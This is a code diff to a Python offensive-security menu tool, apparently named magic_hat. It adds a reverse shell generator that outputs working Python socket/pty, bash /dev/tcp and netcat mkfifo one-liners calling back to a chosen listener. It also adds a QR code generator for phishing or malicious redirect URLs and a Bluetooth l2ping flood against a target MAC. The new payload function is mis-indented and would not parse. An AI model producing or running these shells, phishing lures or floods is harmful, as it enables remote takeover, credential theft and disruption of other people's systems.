@@ -6,6 +6,9 @@ import subprocess
 import re
 from magic_hat.database import log_scan, get_scan_logs, get_connection
 from magic_hat.utils import BANNER_IMAGE, clear_screen, get_all_device_ips, get_subnet_range, send_webhook_notification
+import qrcode  # Requires: pip install qrcode
+import socket
+
 
 def parse_open_ports(nmap_output):
     """Extract open ports and services from Nmap stdout using regex."""
@@ -931,3 +934,116 @@ def handle_bluetooth_recon():
             
     input("\nPress Enter to return...")
     
+    def handle_payload_generator():
+    """Tool: Tactical Reverse Shell & Payload Generator."""
+    clear_screen()
+    print(BANNER_IMAGE)
+    print("=== PAGE: TACTICAL REVERSE SHELL GENERATOR ===")
+    print("-" * 55)
+    print("1. Python3 Socket Reverse Shell")
+    print("2. Bash TCP Reverse Shell One-Liner")
+    print("3. Netcat Traditional / OpenBSD Listener Command")
+    print("99. Back (b)")
+    print("-" * 55)
+    
+    choice = input("Select option [1-3, or 99/b]: ").strip().lower()
+    if choice in ["99", "b", "back"]:
+        return
+        
+    lhost = input("Enter LHOST (Listener IP): ").strip()
+    lport = input("Enter LPORT (Listener Port): ").strip()
+    
+    if not lhost or not lport:
+        print("[-] LHOST and LPORT are required.")
+        input("\nPress Enter to return...")
+        return
+        
+    payload = ""
+    if choice == "1":
+        payload = f"python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"
+    elif choice == "2":
+        payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
+    elif choice == "3":
+        payload = f"nc -e /bin/sh {lhost} {lport}  # (or: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f)"
+        
+    clear_screen()
+    print(BANNER_IMAGE)
+    print("=== GENERATED PAYLOAD STUB ===")
+    print(f"\n{payload}\n")
+    print("-" * 55)
+    log_scan("Payload Generator", f"LHOST:{lhost} LPORT:{lport}", payload)
+    input("Press Enter to return...")
+
+def handle_qr_exploit():
+    """Tool: QR Code Payload / Phishing Vector Generator."""
+    clear_screen()
+    print(BANNER_IMAGE)
+    print("=== PAGE: QR CODE EXPLOIT / PAYLOAD GENERATOR ===")
+    print("-" * 55)
+    target_url = input("Enter payload URL or malicious redirection target: ").strip()
+    if not target_url:
+        return
+        
+    try:
+        qr = qrcode.QRCode(version=1, box_size=1, border=1)
+        qr.add_data(target_url)
+        qr.make(fit=True)
+        
+        clear_screen()
+        print(BANNER_IMAGE)
+        print(f"=== ASCII QR CODE PAYLOAD FOR: {target_url} ===")
+        qr.print_ascii(tty=True)
+        print("-" * 55)
+        log_scan("QR Code Generator", target_url, "Generated ASCII QR payload")
+    except Exception as e:
+        print(f"[-] Failed to generate QR code (ensure 'qrcode' is installed): {e}")
+        
+    input("\nPress Enter to return...")
+
+def handle_bluetooth_attacks():
+    """Tool: Advanced Bluetooth Enumeration & L2CAP Stress Testing."""
+    clear_screen()
+    print(BANNER_IMAGE)
+    print("=== PAGE: BLUETOOTH ATTACK & ENUMERATION SUITE ===")
+    print("-" * 55)
+    print("1. Scan & Enumerate Device SDP Services (sdptool)")
+    print("2. L2CAP Ping Flood / Stress Test (l2ping)")
+    print("99. Back (b)")
+    print("-" * 55)
+    
+    choice = input("Select option [1-2, or 99/b]: ").strip().lower()
+    if choice in ["99", "b", "back"]:
+        return
+        
+    target_mac = input("Enter Target Bluetooth MAC Address (e.g., 00:11:22:33:44:55): ").strip()
+    if not target_mac:
+        return
+        
+    if choice == "1":
+        print(f"\n[+] Querying SDP records for {target_mac}...")
+        try:
+            res = subprocess.run(["sdptool", "browse", target_mac], capture_output=True, text=True, timeout=15)
+            output = res.stdout if res.stdout else res.stderr
+            clear_screen()
+            print(BANNER_IMAGE)
+            print("=== SDP BROWSE RESULTS ===")
+            print(output)
+            log_scan("Bluetooth SDP Browse", target_mac, output)
+        except Exception as e:
+            print(f"[-] SDP browse failed: {e}")
+            
+    elif choice == "2":
+        count = input("Enter packet count (default 500): ").strip() or "500"
+        print(f"\n[+] Executing l2ping stress test against {target_mac} ({count} packets)...")
+        try:
+            res = subprocess.run(["l2ping", "-i", "hci0", "-s", "600", "-c", count, target_mac], capture_output=True, text=True, timeout=20)
+            output = res.stdout
+            clear_screen()
+            print(BANNER_IMAGE)
+            print("=== L2PING STRESS TEST RESULTS ===")
+            print(output)
+            log_scan("Bluetooth l2ping", target_mac, output)
+        except Exception as e:
+            print(f"[-] l2ping attack failed: {e}")
+            
+    input("\nPress Enter to return...")
